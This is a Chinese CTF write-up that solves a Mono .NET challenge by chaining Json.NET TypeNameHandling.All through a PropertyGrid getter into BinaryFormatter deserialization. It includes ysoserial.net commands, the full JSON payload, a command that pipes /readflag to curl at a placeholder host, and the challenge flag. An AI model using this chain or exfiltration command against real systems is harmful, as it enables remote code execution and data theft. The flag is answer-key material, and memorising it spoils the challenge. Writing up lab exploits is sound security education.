# SU_DOTNET

## 题目简述

题目运行在 `mono:6.12.0.182` 容器中，对外提供 `POST /data`。服务端把请求体当作 JSON 反序列化为 `User` 对象，但启用了 Json.NET 的 `TypeNameHandling.All`，攻击者可以用 `$type` 指定实际实例化的类型。

程序还故意提供了 `Evil` 类。它的 `PropertyValue` getter 会把另一个属性 `SerializedValue` 作为 Base64 编码的 .NET 序列化流，交给 `BinaryFormatter.Deserialize`。所以完整数据流是：

```text
不可信 JSON
  -> Json.NET TypeNameHandling.All
  -> PropertyGrid 任意 getter 调用
  -> Evil.PropertyValue
  -> Base64 解码
  -> BinaryFormatter.Deserialize
  -> Mono 可用的命令执行 gadget
```

flag 位于 `/flag.txt`，权限为 `0040`；SUID/SGID 程序 `/readflag` 负责以目标权限输出它。

## 解题过程

### 1. 从程序集恢复反序列化入口

仓库没有提供 C# 源码，但 `Program.exe` 是未混淆的 Mono/.NET 程序。其字符串和 IL 可以还原出三个类型：

```text
Program
User
  String Name
  Int32  Age
  String Email
  Object Address
Evil
  Object PropertyValue
  Object SerializedValue
```

`Program.Main` 启动 `HttpListener`，监听 `http://*:8080/`。只有 `POST /data` 会进入处理逻辑。关键语义可写成：

```csharp
var settings = new JsonSerializerSettings();
settings.TypeNameHandling = TypeNameHandling.All;

User user = JsonConvert.DeserializeObject<User>(body, settings);
```

`TypeNameHandling.All` 会接受 JSON 中的 `$type` 元数据，不再把 `Address` 限制为普通字典或字符串。只要相应程序集存在，就能实例化任意兼容类型。

### 2. 分析题目自带的 `Evil` 桥接类

`Evil.GetDeserializedValue(Object)` 的 IL 对应以下逻辑：

```csharp
public object GetDeserializedValue(object value)
{
    if (value == null)
        return null;

    var formatter = new BinaryFormatter();
    var bytes = Convert.FromBase64String((string)value);
    var stream = new MemoryStream(bytes);
    return formatter.Deserialize(stream);
}
```

更关键的是 `PropertyValue` getter。它不是简单返回字段，而是：

```csharp
public object PropertyValue
{
    get
    {
        return GetDeserializedValue(SerializedValue);
    }
    set
    {
        propertyValue = value;
    }
}
```

因此，只要让某个外层 gadget 在 Json.NET 反序列化期间读取 `Evil.PropertyValue`，即可把 JSON 反序列化桥接到不安全的 `BinaryFormatter`。

### 3. 用 `PropertyGrid` 触发任意 getter

容器安装并启动了 Xvfb，应用进程设置：

```text
DISPLAY=:99
```

这使依赖 Windows Forms 图形环境的 `System.Windows.Forms.PropertyGrid` 可以在 Mono 容器里初始化。将 `User.Address` 指定为 `PropertyGrid`，再把 `SelectedObjects` 设置为包含一个 `Evil` 实例的数组：

```json
{
  "Address": {
    "$type": "System.Windows.Forms.PropertyGrid, System.Windows.Forms",
    "SelectedObjects": [
      {
        "$type": "Evil, Program",
        "SerializedValue": "<base64-binaryformatter-payload>"
      }
    ]
  }
}
```

`PropertyGrid` 为选中对象构造属性视图时会读取属性 getter，于是调用：

```text
Evil.PropertyValue
  -> Evil.GetDeserializedValue(Evil.SerializedValue)
  -> BinaryFormatter.Deserialize(...)
```

响应中出现：

```text
Received User: Name=, Age=0, Email=,
Address=System.Windows.Forms.PropertyGrid
```

只能证明外层 `PropertyGrid` 已成功创建。最终命令执行是否发生，应另外使用无害文件创建、HTTP 回连或命令输出外带验证。

### 4. 选择适配 Mono 的内层 gadget

普通 .NET Framework gadget 不一定能在 Mono 上工作。题目镜像固定为 Mono 6.12，官方验证可用的是 `TypeConfuseDelegateMono`。这个 gadget 是针对 Mono 行为调整过的 `TypeConfuseDelegate`，受支持格式包括 `BinaryFormatter`。

官方材料指出，较新的预编译版本在生成该链时曾出现兼容问题，赛时使用的是 [ysoserial.net v1.32](https://github.com/pwntester/ysoserial.net/releases/tag/v1.32)。先用无害命令验证：

```powershell
.\ysoserial.exe `
  -f BinaryFormatter `
  -g TypeConfuseDelegateMono `
  -c "touch /tmp/suctf-proof" `
  --rawcmd `
  -o base64
```

确认链条可用后，改为调用题目提供的 `/readflag`，并把标准输出发送到自己的接收端。下面的 `http://A` 是占位地址：

```powershell
.\ysoserial.exe `
  -f BinaryFormatter `
  -g TypeConfuseDelegateMono `
  -c "/bin/sh -c '/readflag | curl -d @- http://A'" `
  --rawcmd `
  -o base64
```

把输出的 Base64 字符串填入 `SerializedValue`，再发送：

```http
POST /data HTTP/1.1
Host: challenge
Content-Type: application/json

{
  "Address": {
    "$type": "System.Windows.Forms.PropertyGrid, System.Windows.Forms",
    "SelectedObjects": [
      {
        "$type": "Evil, Program",
        "SerializedValue": "<生成的 Base64>"
      }
    ]
  }
}
```

仓库中的 `flag.txt` 保存了静态 flag：

```text
flag{6f2aca7e03975c0c09028a3b413253c9}
```

完整 gadget 清单、支持的格式和命令行参数可查阅 [ysoserial.net 项目文档](https://github.com/pwntester/ysoserial.net)。这里保留链接是因为工具版本与 Mono 兼容性会影响 payload 生成；本题所需的入口、外层对象图和触发原因已经在正文中完整说明。

## 方法总结

本题不是把一个 ysoserial 输出直接塞进 HTTP 请求那么简单，而是两种反序列化机制的桥接：

1. Json.NET 的 `TypeNameHandling.All` 允许外层 JSON 创建 `PropertyGrid` 和题目程序集中的 `Evil`；
2. `PropertyGrid.SelectedObjects` 提供任意属性 getter 的触发能力；
3. `Evil.PropertyValue` 把 Base64 字符串送入 `BinaryFormatter.Deserialize`；
4. 内层必须选择能在 Mono 6.12 上工作的 `TypeConfuseDelegateMono`。

审计 .NET 反序列化题时，要同时确认格式、运行时、可加载程序集、外层 getter/constructor 触发点和内层 gadget 的版本兼容性。看到 `$type` 只说明类型控制可能存在；只有把实际调用路径推进到危险 getter 或二次反序列化 sink，才能证明完整利用链。
